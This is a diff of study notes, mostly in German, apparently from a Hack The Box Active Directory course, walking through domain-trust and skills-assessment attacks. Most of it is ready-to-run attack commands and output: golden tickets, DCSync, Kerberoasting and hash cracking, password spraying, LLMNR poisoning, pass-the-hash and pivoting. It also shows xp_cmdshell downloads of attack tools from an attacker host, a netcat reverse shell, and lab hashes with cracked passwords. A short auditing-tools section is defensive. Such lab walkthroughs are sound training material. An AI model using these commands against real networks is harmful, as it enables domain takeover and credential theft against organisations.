+			- Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+	
+	- Creating a Golden Ticket with Mimikatz:
+		- mimikatz.exe
+		- mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+	- Confirm Kerberos Ticket:
+		- klist
+	- Listing the Entire C: Drive of the Domain Controller:
+		- ls \\academy-ea-dc01.inlanefreight.local\c$
+
+- ExtraSids Attack - Rubeus:
+	- Den Angriff koennen wir auch mit Ruebeus durchfuehren
+	- Creating a Golden Ticket using Rubeus:
+		- .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+	- Confirming the Ticket is in Memory Using klist:
+		- klist
+	- Performing a DCSync Attack:
+		- .\mimikatz.exe
+		- mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+
+3. Attacking Domain Trusts - Child -> Parent Thrusts - from Linux:
+- Wir koennen diesen Angriff auch von einem Linux Host ausfuehren
+- Wir benoetigen dafuer diese Sachen:
+	- KRBTGT Hash fuer die Child Domain
+	- SID fuer die Child Domain:
+	- Name des Targetuser in der Child Domain
+	- FQDN von der Child Domain
+	- SID von der Enterprise Admin Gruppe von der Root Domaine
+
+- Wenn wir Kontrolle ueber die Kinder Domaine haben koennen wir mit secretsdumb.py einen DCSync Angriff ausfuehren um einen NTLM Hash fuer den KRBTGT Account zu bekommen
+- Performing DCSync with secretsdump.py:
+	- secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+- Jetzt muessen wir das SID der Child Domaine bekommen:
+	- lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
+- Domain SID ausgeben:
+	- lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+- Grabbing the Domain SID & Attaching to Enterprise Admin's RID:
+	- lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+- Constructing a Golden Ticket using ticketer.py:
+	- ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+- Setting the KRB5CCNAME Environment Variable:
+	- export KRB5CCNAME=hacker.ccache
+- Getting a SYSTEM shell using Impacket's psexec.py:
+	- psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+
+- Impacket hat ausserdem eine automatisches Tool fuer die raiseChild.py(https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) der von der Child Domain in die Parent Domain eskalieren kann
+
+- Performing the Attack with raiseChild.py:
+	- raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+
+Question:
+	Secretdumps.py -just-dc-ntlm LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+
+###################################################################################################
+Breaking Down Boundaries
+1. Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows:
+- Cross-Forest Kerberoasting:
+	- Manchmal koennen die Rechte in der aktuellen Domaine nicht eskaliert werden es ist nur moeglich sich ein Kerberos Ticket zu holen
+	- Das Keberos Ticket koennen wir fuer ein Admin user in einer anderen Domaine cracken 
+	- Enumerating Accounts for Associated SPNs Using Get-DomainUser:
+		- Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+	- Enumerating the mssqlsvc Account:
+		- Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+	- Performing a Kerberoasting Attacking with Rubeus Using /domain Flag:
+		- .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+- Admin Password Re-Use & Group Membership:
+	- Manchmal gibt es in zwei Domainen einen gleichnamigen Account die manchmal die gleichen Passwoerter haben
+	- Diese gleichnamigen Accoutns koennen unterschliedliche Rechte haben die wir ausnutzen koennen
+	- Using Get-DomainForeignGroupMember:
+		- Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+	- Accessing DC03 Using Enter-PSSession:
+		- Wir koennen Kontrolle ueber den Doman Controller mit dem Admin Konto uebernehmnen
+		- Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+
+- SID History Abuse - Cross Forest:
+	- Wenn SID Filtering deaktiviert ist koennen wir mittels sidHistory uns mehr Rechte fuer den anderen Forest holen
+
+Question:
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+[*] SamAccountName         : mssqlsvc
+[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
+[*] PwdLastSet             : 3/24/2022 12:47:52 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$FE506F9A511263F84D067730DB7A4B78$AB9B73587A83492B2286806BE8F487A5C1BA488346BA632753D06A58372FF91C167435DBBC6D0CD175EA25F77717986B08E71F44423ED6F1362A45CFF7FD07FC00450D2C2D9EF4D48DC47C4309C7B3C793BCA85A852A9E495DC5227BF16A3BCCEA39179A65EC6B736F3FDD451C2669DEC6B484F238C049ECEEF050B5AF1A1E763C191DB8921D46299416AC43F543D3B71EF2E9AC59CFE4BE96573C19FEB994DBC93D983F823E1F2A20D70D5C2E605EE5C6F4C3960D00391C65DFC4C03F98F09D9FF1D86BB82FF57FE646A84F44DBFD459D20F358833CFB458A901A79AD3BD3EC0A5BE668EF97C5C105873AF53EA68D59061444F7246E934F8E7C139878A22A04F3995C772D9EBC41FDB7AD211F64D7775050BBE346AD5AA6A70738042573B102385712D087877049C208BDD994C8724AAA05EE1A2CBED559733C5C410448B1188E9C3102014388BD60C6DC917BED3451C847832DDBDD5722769D5CF242D45CF6A6A6546587CB5962C0DDD903E777B2A16A4E737F5440F327BFC5C5C45D80EEB9814CABE9A7A3E98F5881F601DD50B1D11D3A6E93FBED64A12C6CF9D09DDCFE4F2C5ACBEF58FFD590068FF4C8BE9B6E9D5CDBBA045084BAD5E1B959FD300379A72BB491DD8B9BEF4AC19006934ABD76C036A99205EF7F6CC054DA64865C9D9706AFB67C56E1264512D7945A5872E58B11DF119BEA73FB212046B4249AC1A12C8CC63BB02B575AEE4D1158CA1F2EEEB331CF4E3601CE0D711AAA157792138DCF8DD0679606B23147CE7735A999A2A0BD87786FFFAD17EC9A48A1132BAF08CBD9826A3519C4E21446CB9502E4419D5298AF69C80375B7EFD45799270E19A0B4E046361FAF9FA60884E71316B7ECB2CE05E120DD454840B3611F75313F6E0EA8176024E50E31BE6529EFDCDB56A6B3F56F8DCF637A7B2DCC3BBBB712FCD3C28E79A0F605F7C6D6F313026387D202CA4465D6C44513D25F6B00F0B220C46EB0DA037CDC25039DB728B565A122B89FA4059FAB1C4595B0680BC8D007E7A3E8A4F6CAF233F807F3385236C834D01AFA9C9810E0F439FBF949DCF37DDD11B60EDDB370A5EF1DE827CBBCDE0DAD16E0C1B0CD0540CF693508879014E8D4B117BC5C28E1083055E51A70381A59DE044A228562A1F67E150C75B410D46BB0B9744F562EB7FE80692B8E5A26CCFA0B3A84AF6C369081D6651775442461D226AC61138442C160D325B7DAAB46FF5369A484247B21BD3FED8B889AECAC13403486AE05F4D3FADD910DD6E3322B8BC890CB02F4BB09F93EB05823BAE415FBC404EDE5FFD2AF96DA8AE15248EBD7B3BBA157DAF4FF187992C98A4D60816FA677219E062FF6D1FDD2C683C3A1DD6B6EC6BEB61D08C8F71D95DA8B58D4D83018AAB370B250D68D2456272E6D51D65502D301316D469193B5034850BDA7729ADC70A51954828FEF03EA066FFA6E49433C7FB6235F29EDD28CF9F6DB89DA57C492CD74D6F6FB74B10AE34F2EE9AA9B45304477185360479F1352D75CA46480E370381E7BCF530D874782E72BD99610BCEFD6F96A9CDE343EEEF322F9A731D18AF678A5E4F791626A1BC10C45DD20B50605B11786518FE0EA3EF47E0D00EBB72003BF73B16E9E764BBB5315CE3E69E74C865D8600D11A2B82C53E98D6D7E2C037BD3DAC 
+
+hashcat -m 13100 aa.txt /usr/share/wordlists/rockyou.txt
+
+
+2. Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux:
+- Wir koennen Kerberoast auch ueber Forests hinweg durchfuehren
+- Auf Linxu Angriffshosts kann dieser auch mit GetUserSPNs.py ausgefuehrt werden
+- Um das auszufuehren benoetigen wir einen User der sich an einer anderen Domaine authentifizieren kann
+- Cross-Forest Kerberoasting:
+	- Gibt den UserSPN von wley zuerueck
+		- GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+	- Gibt TGS Ticket zurueck:
+		- GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+- Hunting Foreign Group Membership with Bloodhound-python:
+	- Manche User koennen in zwei Domainen vorkommen diese beiden Accounts koennten verschiedene Rechte aber die gleichen Passwoerter haben
+	- Running bloodhound-python Against INLANEFREIGHT.LOCAL:
+		- bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+	- Compressing the File with zip -r:
+		- zip -r ilfreight_bh.zip *.json
+	- Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL:
+		- bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+
+Question:
+- psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.FREIGHTLOGISTICS.local -target-ip 172.16.5.238 -k
+
+###################################################################################################
+Defensie Considerations
+1. Additional AD Auditing Techniques:
+- Creating an AD Snapshot with Active Directory Explorer:
+	- Mit einem AD Explorer koennen wir alle Objekte, Gruppen usw ausgeben
+	- Dafuer benoetigen wir gueltige Credentials
+	- Wir koennen ausserdem ein Snapshot erstellen fuer nachtraegliche Analyse
+	- AD Explorer File -> Create Snapshot
+
+- PingCastle(https://www.pingcastle.com/documentation/):
+	- PingCastle ist ein maechtiges Tool um die Sicherheitslage in einer AD Umgebung zu bewerten
+	- PingCastle kann ebenfalls Karten und Diagramme der AD Umgebung darstellen
+	- PingCastle erstellt ein Report der AD Umgebung, den Report koenenn wir im Browser anzeigen lassen
+	- PingCastle.exe
+
+- Group3r(https://github.com/Group3r/Group3r):
+	- Group3r findet Schwachstellen in AD Gruppen Richtlinien
+	- Group3r muss auf einem Host in einer Domaine ausgefuehrt werden
+	- Das Attribut -f gibt die Ausgabe aus in einer Datei uns -s gibt die Ausgabe in das Terminal aus
+	- group3r.exe -f <filepath-name.log>
+	- group3r.exe -s
+
+- ADRecon:
+	- ADRecon ist ein gutes Tool wenn wir nicht vorsichtig sein muessen
+	- Wenn der Scan fertig ist koennen wie den Bericht als .xml und .html Datei anzeigen
+
+###################################################################################################
+Skill Assessment - Final Showdown
+1. AD Enumeration & Attacks - Skills Assessment Part I:
+	1. Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer
+	- setspn -T medin -Q */*
+	CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+		MSSQLSvc/SQL01.inlanefreight.local:1433
+
+
+	2. Crack the account's password. Submit the cleartext value.
+	- Get Reverse Shell with PowerShell3 Base64
+
+	- Add-Type -AssemblyName System.IdentityModel
+	- New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL01.inlanefreight.local:1433"
+
+	- Import-Module PowerView.ps1
+	- Get-DomainUser * -spn | select samaccountname
+	- Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
+
+	- hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+	- svc_sql:lucky7
+
+	3. Submit the contents of the flag.txt file on the Administrator desktop on MS01
+	- Expand-Archive C:\chisel.zip -DestinationPath C:\
+
+	- Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+
+	- Resolve-DnsName -Name MS01.INLANEFREIGHT.LOCAL
+	- MS01.INLANEFREIGHT.LOCAL  A  1200  Answer 172.16.6.50
+
+	- sudo nano /etc/proxychains.conf
+	  - socks5 127.0.0.1 1080
+	- sudo chisel server --reverse -v -p 1234 --socks5
+	- .\chisel.exe client -v 10.10.15.115:1234 R:socks
+	- proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /p:lucky7
+
+	4. Find cleartext credentials for another domain user. Submit the username as your answer.
+	- proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /p:lucky7 /drive:HOME,/home/$USER
+
+	5. Submit this user's cleartext password.
+	- - proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /p:lucky7 /drive:HOME,/home/$USER
+	- reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+	- gpupdate /force
+
+	- privilege::debug
+	- sekurlsa::logonpasswords
+
+	6. What attack can this user perform?
+	- DSYNC
+
+	7. Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01
+	- Resolve-DnsName -Name DC01.INLANEFREIGHT.LOCAL
+	DC01.INLANEFREIGHT.LOCAL                       A      3600  Answer     172.16.6.3
+	- proxychains secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/tpetty@172.16.6.3
+	- Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
+	sudo proxychains wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0 Administrator@172.16.6.3
+
+2. AD Enumeration & Attacks - Skills Assessment Part II:
+ssh htb-student@10.129.147.131
+
+1. Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?
+- sudo nmap -v -A 172.16.7.3
+	Host script results:
+	| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:3c:79 (VMware)
+	| Names:
+	|   INLANEFREIGHT<00>    Flags: <group><active>
+	|   INLANEFREIGHT<1c>    Flags: <group><active>
+	|   DC01<00>             Flags: <unique><active>
+	|   DC01<20>             Flags: <unique><active>
+	|_  INLANEFREIGHT<1b>    Flags: <unique><active>
+	| smb2-security-mode: 
+	|   3.1.1: 
+	|_    Message signing enabled and required
+	| smb2-time: 
+	|   date: 2023-05-01T17:04:48
+	|_  start_date: N/A
+
+
+- sudo nmap -v -A 172.16.7.50
+	| rdp-ntlm-info: 
+	|   Target_Name: INLANEFREIGHT
+	|   NetBIOS_Domain_Name: INLANEFREIGHT
+	|   NetBIOS_Computer_Name: MS01
+	|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
+	|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
+	|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
+
+- sudo nmap -v -A 172.16.7.60
+	| ms-sql-ntlm-info: 
+	|   Target_Name: INLANEFREIGHT
+	|   NetBIOS_Domain_Name: INLANEFREIGHT
+	|   NetBIOS_Computer_Name: SQL01
+	|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
+	|   DNS_Computer_Name: SQL01.INLANEFREIGHT.LOCAL
+	|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
+	|_  Product_Version: 10.0.17763
+
+	Host script results:
+	| smb2-time: 
+	|   date: 2023-05-01T16:58:03
+	|_  start_date: N/A
+	| nbstat: NetBIOS name: SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:14:1b (VMware)
+	| Names:
+	|   SQL01<00>            Flags: <unique><active>
+	|   INLANEFREIGHT<00>    Flags: <group><active>
+	|_  SQL01<20>            Flags: <unique><active>
+	| smb2-security-mode: 
+	|   3.1.1: 
+	|_    Message signing enabled but not required
+	| ms-sql-info: 
+	|   Windows server name: SQL01
+	|   172.16.7.60\SQLEXPRESS: 
+	|     Instance name: SQLEXPRESS
+	|     Version: 
+	|       name: Microsoft SQL Server 2019 RTM
+	|       number: 15.00.2000.00
+	|       Product: Microsoft SQL Server 2019
+	|       Service pack level: RTM
+	|       Post-SP patches applied: false
+	|     TCP port: 1433
+	|_    Clustered: false
+
+- fping -asgq 172.16.6.0/23
+	- 172.16.7.3 DNS
+	- 172.16.7.50 MS01
+	- 172.16.7.60 SQL01
+	- 172.16.7.240(Ourself)
+
+- sudo responder -I ens224
+	- NTLMv2-SSP Username: INLANEFREIGHT\AB920
+
+2. What is this user's cleartext password?
+- sudo responder -I ens224
+		- NTLMv2-SSP Hash: AB920::INLANEFREIGHT:aabc043c9bace250:51BA7D55CFCA837D316AC324689588BB:0101000000000000809A3B01337CD901FC3BED3544E38A0500000000020008003300380051004D0001001E00570049004E002D004E004F0059003400500050004F00480037004100310004003400570049004E002D004E004F0059003400500050004F0048003700410031002E003300380051004D002E004C004F00430041004C00030014003300380051004D002E004C004F00430041004C00050014003300380051004D002E004C004F00430041004C0007000800809A3B01337CD9010600040002000000080030003000000000000000000000000020000028AC25D9AD48F3912B9AAF8A36EB5E8E5950E8DFA4F7BF1879154232D06BE3720A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
+
+Cleartext: weasal
+AB920:weasal
+
+3. Submit the contents of the C:\flag.txt file on MS01.
+- Connect to 172.16.7.50
+- ssh -D 9050 htb-student@10.129.73.83
+- proxychains xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal
+
+4. Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.
+- proxychains xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:HOME,/home/$USER
+- Import-Module .\DomainPasswordSpray.ps1
+- Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+- BR086
+
+5. What is this user's password?
+- proxychains xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:HOME,/home/$USER
+- Import-Module .\DomainPasswordSpray.ps1
+- Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+- BR086:Welcome1
+
+6. Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?
+- smbmap -u BR086 -p 'Welcome1' -H 172.16.7.3
+	Department Shares                                 	READ ONLY	Share for department users
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	SYSVOL                                            	READ ONLY	Logon server share 
+
+- smbclient -U BR086 -W INLANEFREIGHT.LOCAL //172.16.7.3/'Department Shares'
+	- get IT\Private\Development\web.config
+netdb:D@ta_bAse_adm1n!
+
+7. Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.
+- python3 -m http.server 9000
+- nc -lvnp 4444
+
+- mssqlclient.py INLANEFREIGHT.LOCAL/netdb@172.16.7.60
+	- enable_xp_cmdshell
+	- xp_cmdshell "powershell.exe wget http://172.16.7.240:9000/nc.exe -OutFile c:\\Users\Public\\nc.exe"
+	- xp_cmdshell "powershell.exe wget http://172.16.7.240:9000/PrintSpoofer32.exe -OutFile c:\\Users\Public\\PrintSpoofer32.exe"
+	- xp_cmdshell "powershell.exe wget http://172.16.7.240:9000/mimikatz.exe -OutFile c:\\Users\Public\\mimikatzx64.exe"
+	- xp_cmdshell "powershell.exe wget http://172.16.7.240:9000/PowerView.ps1 -OutFile c:\\Users\Public\\PowerView.ps1"
+	- xp_cmdshell "powershell.exe wget http://172.16.7.240:9000/Responder.exe -OutFile c:\\Users\Public\\Responder.exe"
+	- xp_cmdshell "powershell.exe wget http://172.16.7.240:9000/Inveigh.ps1 -OutFile c:\\Users\Public\\Inveigh.ps1"
+	- xp_cmdshell "C:\\Users\Public\\nc.exe 172.16.7.240 4444 -e powershell"
+
+- PrintSpoofer:
+	- .\PrintSpoofer32.exe -i -c powershell
+
+8. Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.
+- reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+
+- .\mimikatzx64.exe
+	- privilege::debug
+	- sekurlsa::logonPasswords full
+		- Username : mssqlsvc
+		- Domain   : INLANEFREIGHT
+		- NTLM     : 8c9555327d95f815987c0d81238c7660
+	- lsadump::sam
+		- User : Administrator
+		- Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99
+	- lsadump::secrets
+- proxychains evil-winrm -i 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
+
+9. Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What this user's account name?
+- proxychains evil-winrm -i 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
+	- reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+- proxychains xfreerdp /v:172.16.7.50 /u:Administrator /pth:bdaffbfe64f1fc646a3353be1c2c3c99 /drive:HOME,/home/$USER
+
+- Import-Module .\Invoke-Inveigh.ps1
+- Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+- CT059::INLANEFREIGHT:C5252771C9BC0663:66F5526311CA574F900A881C065EEB29:0101000000000000EE8F5ECD137DD901F77B1DE5D7B8F84B0000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800EE8F5ECD137DD90106000400020000000800300030000000000000000000000000200000D26B578DBB9E3A2A975FA70A8C88A328DFE243578704A964837387AA6268032F0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
+
+10. Crack this user's password hash and submit the cleartext password as your answer.
+- hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+- CT059::INLANEFREIGHT:c5252771c9bc0663:66f5526311ca574f900a881c065eeb29:0101000000000000ee8f5ecd137dd901f77b1de5d7b8f84b0000000002001a0049004e004c0041004e0045004600520045004900470048005400010008004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00030030004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0007000800ee8f5ecd137dd90106000400020000000800300030000000000000000000000000200000d26b578dbb9e3a2a975fa70a8c88a328dfe243578704a964837387aa6268032f0a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0037002e0035003000000000000000000000000000:charlie1
+
+11.Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.
+
+- proxychains secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOCAL/CT059@172.16.7.3
+- Run PowerShell as CT059
+	- Add-WindowsFeature RSAT-AD-PowerShell
+	- Import-Module ActiveDirectory
+	- Add-ADGroupMember -Identity "domain admins" -Members CT059
+
+- $password = ConvertTo-SecureString "charlie1" -AsPlainText -Force
+- $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\CT059", $password)
+- Enter-PSSession -ComputerName DC01 -Credential $cred
+### Allow RDP Connections
+- Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+
+12. Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.
+
+- proxychains xfreerdp /v:172.16.7.3 /u:CT059 /p:charlie1 /drive:HOME,/home/$USER
+- wget http://172.16.7.240:9000/mimikatz.exe -OutFile c:\\mimikatz.exe
+- .\mimikatz.exe
+	- privilege::debug
+	- token::elevateclear
+	- lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\KRBTGT
+		- 7eba70412d81c1cd030d72a3e8dbe05f
